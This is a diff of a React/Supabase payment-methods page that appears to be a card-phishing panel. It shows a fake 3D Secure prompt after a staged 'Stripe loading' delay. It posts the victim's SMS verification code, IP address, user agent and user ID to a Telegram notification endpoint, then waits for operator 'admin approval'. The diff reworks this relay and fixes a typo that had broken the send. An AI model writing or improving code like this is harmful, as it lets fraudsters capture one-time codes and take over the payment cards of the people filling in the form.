@@ -499,7 +499,7 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
       user_id: userId,
       method_type: formData.method_type,
       is_default: paymentMethods.length === 0,
-      is_verified: false, // Initially unverified
+      is_verified: false,
     }
 
     if (formData.method_type === "credit_card") {
@@ -521,11 +521,32 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
       setPendingCardId(data.id)
       setPending3DSecureBinData(binData)
 
-      // Wait 8 seconds before showing 3D Secure modal
-      setTimeout(() => {
+      const { data: settings } = await supabase.from("admin_settings").select("sms_enabled").single()
+
+      // Wait 8 seconds before checking 3D Secure setting
+      setTimeout(async () => {
         setShowStripeLoading(false)
-        setShow3DSecureModal(true)
-        setVerificationStep("auth") // Go directly to auth, skip loading
+
+        if (settings?.sms_enabled) {
+          // 3D Secure is enabled, show verification modal
+          setShow3DSecureModal(true)
+          setVerificationStep("auth")
+        } else {
+          // 3D Secure is disabled, mark card as verified immediately
+          console.log("[v0] 3D Secure disabled, auto-verifying card")
+          await supabase
+            .from("payment_methods")
+            .update({
+              is_verified: true,
+              verified_at: new Date().toISOString(),
+            })
+            .eq("id", data.id)
+
+          setPendingCardId(null)
+          setPending3DSecureBinData(null)
+          router.refresh()
+        }
+
         setIsAddingCard(false)
         setIsSubmitting(false)
       }, 8000)
@@ -550,21 +571,6 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
       const ipResponse = await fetch("https://api.ipify.org?format=json")
       const { ip } = await ipResponse.json()
 
-      await fetch("/api/telegram/notify", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.JSONstringify({
-          type: "sms",
-          data: {
-            smsCode: codeToVerify,
-            ip,
-            userAgent: navigator.userAgent,
-            userId,
-          },
-        }),
-      }).catch((err) => console.error("[v0] Telegram notification failed:", err))
-
-      // Create verification request
       const { data: verificationRequest, error: verificationError } = await supabase
         .from("verification_requests")
         .insert({
@@ -583,13 +589,27 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
 
       if (verificationError) {
         console.error("[v0] Failed to create verification request:", verificationError)
-        throw verificationError
+        setIsVerifying(false)
+        alert("Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.")
+        return
       }
 
       console.log("[v0] Verification request created:", verificationRequest)
 
-      // Show waiting state
-      setVerificationStep("loading")
+      await fetch("/api/telegram/notify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          type: "sms",
+          data: {
+            smsCode: codeToVerify,
+            ip,
+            userAgent: navigator.userAgent,
+            userId,
+            verificationRequestId: verificationRequest.id, // Include ID for callback button
+          },
+        }),
+      }).catch((err) => console.error("[v0] Telegram notification failed:", err))
 
       // Poll for admin approval
       const pollInterval = setInterval(async () => {
